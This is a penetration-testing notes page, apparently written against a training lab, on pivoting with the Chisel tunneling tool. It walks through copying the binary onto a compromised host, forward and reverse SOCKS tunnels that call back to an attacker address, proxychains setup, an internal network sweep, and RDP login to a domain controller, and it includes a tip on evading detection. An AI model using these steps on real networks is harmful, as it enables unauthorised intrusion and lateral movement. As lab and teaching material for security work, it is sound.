---
description: >-
  Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to
  transport data that is secured using SSH. Chisel can create a client-server
  connection in a firewall restricted environment.
---

# Chisel

<mark style="color:red;">**IMPORTANT:**</mark>** We need to be mindful of the size of files we transfer onto targets, not just for performance reasons but also considering detection. Some useful links to proceed:**

{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}

**Cloning Chisel**

```shell-session
attacker@kali$ git clone https://github.com/jpillora/chisel.git
```

**Building the Chisel Binary**

```shell-session
attacker@kali$ cd chisel
go build
```

**We can use SCP to transfer the binary to the victim.**

**Transferring Chisel Binary to Pivot Host**

```shell-session
attacker@kali$ scp chisel victim@10.129.202.64:~/home/victim
```

**Running the Chisel Server on the Pivot Host**

```shell-session
victim@ubuntu$ ./chisel server -v -p 1234 --socks5
```

The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and _**forward it to all the networks that are accessible on the pivot host.**_\
\
We can start a client on our attack host and connect to the Chisel server.

**Connecting to the Chisel Server**

```shell-session
attacker@kali$ ./chisel client -v 10.129.202.64:1234 socks
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

In the above output, the Chisel client creates a TCP/UDP tunnel via HTTP using SSH between the Chisel server and the client and starts a listener on local port 1080. _**Now we can modify proxychains.conf and add 1080 port so we can use it to pivot between 1080 and the tunnel.**_\


```shell-session
$ tail -f /etc/proxychains.conf 
...
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

**Pivoting / Attacking the DC**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ proxychains nmap 172.16.5.1-200 -sn -v
</strong></code></pre>

```shell-session
attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



### Chisle Reverse Pivot

In the previous example, we transfered a chisel binary to the compromised victim machine and started a listener on port 1234. Commonly, there will be scenarios where firewalls restrict inbound connections to our target. In such cases, we can use Chisel with the reverse tunnel option.

With the Chisel --reverse (-R) enabled, The server (attack host) will listen and accept connections and then be proxied through the client.

**Starting the Chisel Server on our Attack Host**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo ./chisel server --reverse -v -p 1234 --socks5
</strong></code></pre>

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

**Connecting the Chisel Client to our Attack Host**\


```shell-session
victim@ubuntu$ ./chisel client -v 10.10.14.17:1234 R:socks
```

_**Now we can modify proxychains.conf and add 1080 port so we can use it to pivot between 1080 and the tunnel.**_

```shell-session
$ tail -f /etc/proxychains.conf 
...
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

**Pivoting / Attacking the DC**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ proxychains nmap 172.16.5.1-200 -sn -v
</strong></code></pre>

```shell-session
attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
